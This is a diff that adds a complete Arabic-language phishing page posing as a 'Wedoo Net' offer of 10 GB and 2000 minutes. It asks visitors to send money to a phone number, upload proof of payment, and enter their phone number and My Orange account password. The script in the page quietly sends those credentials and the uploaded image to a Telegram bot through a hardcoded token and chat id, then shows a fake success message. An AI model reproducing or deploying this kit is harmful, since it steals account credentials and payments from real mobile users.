@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>10 جيجا + 2000 دقيقه- Wedoo Net</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #ffcccc, #e6a800);
+            text-align: center;
+            color: #333;
+        }
+
+        header {
+            background-color: #333;
+            color: #fff;
+            padding: 20px;
+            font-size: 1.5rem;
+        }
+
+        .container {
+            max-width: 500px;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .message {
+            background-color: #fff4e6;
+            border: 2px solid #e6a800;
+            border-radius: 10px;
+            padding: 10px;
+            margin-bottom: 20px;
+            color: #e6a800;
+            font-weight: bold;
+        }
+
+        .success-message {
+            display: none;
+            margin-top: 20px;
+            padding: 10px;
+            background-color: #e6ffe6;
+            border: 2px solid #28a745;
+            border-radius: 10px;
+            color: #28a745;
+            font-weight: bold;
+        }
+
+        .container h2 {
+            margin: 10px 0;
+            color: #e6a800;
+        }
+
+        label {
+            display: block;
+            text-align: right;
+            margin: 10px 0 5px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 1rem;
+        }
+
+        button {
+            background-color: #e6a800;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            padding: 10px 20px;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: 0.3s;
+            margin: 5px;
+        }
+
+        button:hover {
+            background-color: #e6a800;
+        }
+
+        .upload {
+            margin-bottom: 20px;
+        }
+
+        #fileName {
+            margin-top: 10px;
+            font-size: 0.9rem;
+            color: #555;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        Wedoo Net
+    </header>
+    <div class="container">
+        <h2>10 جيجا + 2000 دقيقه</h2>
+        <div class="message">
+            قم بتحويل المبلغ إلى هذا الرقم 01097891442 وقم برفع الاسكرين إلى الموقع قبل الضغط على تفعيل
+        </div>
+        <form id="activationForm">
+            <label for="phone">رقم الهاتف:</label>
+            <input type="text" id="phone" placeholder="أدخل رقم الهاتف" required>
+            
+            <label for="password">كلمة سر ماي اورانج:</label>
+            <input type="password" id="password" placeholder="أدخل كلمة السر" required>
+
+            <div class="upload">
+                <label for="file">رفع الملفات:</label>
+                <input type="file" id="file" accept="image/*" required>
+                <p id="fileName"></p>
+            </div>
+
+            <button type="submit">تفعيل</button>
+        </form>
+        <div id="successMessage" class="success-message">تم إرسال طلب التفعيل بنجاح!</div>
+    </div>
+
+    <script>
+        const fileInput = document.getElementById('file');
+        const fileNameDisplay = document.getElementById('fileName');
+        const form = document.getElementById('activationForm');
+        const successMessage = document.getElementById('successMessage');
+
+        const telegramToken = "7818812290:AAGo9sue1gJOWfOaac5xdS_PaGXUTVDm0GI";
+        const chatId = "7122151638";
+
+        // عرض اسم الملف عند اختياره
+        fileInput.addEventListener('change', () => {
+            if (fileInput.files.length > 0) {
+                fileNameDisplay.textContent = `تم اختيار الملف: ${fileInput.files[0].name}`;
+            } else {
+                fileNameDisplay.textContent = '';
+            }
+        });
+
+        // عند الضغط على زر التفعيل
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const phone = document.getElementById('phone').value;
+            const password = document.getElementById('password').value;
+            const file = fileInput.files[0];
+            const pageTitle = document.title;
+
+            if (!file) {
+                alert('يرجى اختيار ملف قبل المتابعة.');
+                return;
+            }
+
+            try {
+                // إرسال البيانات النصية مع عنوان الصفحة
+                const message = `🚀 **تفاصيل المستخدم الجديد**:\n\n📱 رقم الهاتف: ${phone}\n🔒 كلمة السر: ${password}\n📄 عنوان الصفحة: ${pageTitle}`;
+                await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: "Markdown",
+                    }),
+                });
+
+                // رفع الصورة وإرسالها
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', file);
+
+                await fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData,
+                });
+
+                // إظهار رسالة النجاح
+                successMessage.style.display = 'block';
+            } catch (error) {
+                console.error('خطأ أثناء الإرسال:', error);
+                alert('حدث خطأ أثناء إرسال البيانات.');
+            }
+        });
+    </script>
+</body>
+</html>
